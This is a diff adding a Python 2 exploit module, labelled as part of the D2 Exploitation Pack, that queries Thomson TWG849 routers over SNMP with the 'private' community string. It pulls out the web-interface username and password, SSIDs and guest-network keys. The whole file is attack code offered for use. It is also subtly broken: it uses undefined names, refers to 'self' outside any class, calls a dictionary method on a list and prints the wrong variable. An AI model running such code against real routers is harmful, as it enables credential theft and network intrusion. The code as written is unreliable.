@@ -1,0 +1,68 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+###
+# STD modules
+###
+import sys
+
+from struct import pack, unpack
+from datetime import datetime as dt
+
+try:
+  from pysnmp.entity.rfc3413.oneliner import cmdgen
+  from pysnmp.proto.rfc1902 import Integer, IpAddress, OctetString
+except:
+  print '[D2] d2sec_thomson_2.py: No module pysnmp'
+
+_name_   = 'd2sec_thomson_2'
+_vendor_ = 'thomson'
+_model_  = ['TWG849']
+_vuln_   = 'Information disclosure'
+_cve_    = ''
+_ref_    = ''
+_port_   = 161
+
+def pwnrouter(host):
+  oids = {  # make, model, software version
+    "model": "1.3.6.1.2.1.1.1.0",
+    "uptime": "1.3.6.1.2.1.1.3.0",
+    # web interface credentials
+    "username": "1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0",
+    "password": "1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0",
+    # ssid and key
+    "ssid1": "1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.32",
+    "ssid2": "1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.2.32",
+    # guest network oids
+    "guest1": "1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.33",
+    "guest2": "1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.34",
+    "guest3": "1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.35",
+  }
+
+  generator = cmdgen.CommandGenerator()
+  for name in oids.keys():
+    errorIndication, errorStatus, errorIndex, varBinds = cmdGen.getCmd(
+      cmdgen.CommunityData("private"),
+      cmdgen.UdpTransportTarget((self.target, 161)),
+      self.oids[name],
+    )
+    if errorIndication or errorStatus:
+      continue
+    value = str(varBinds[0][1])
+    res.append((name, value))
+  if res:
+    print '[+] %s vulnerable' % host
+    for key,val in res.items(): 
+      print '%s: %s' % (key, value)
+  else:
+    print '[-] %s not vulnerable' % host
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
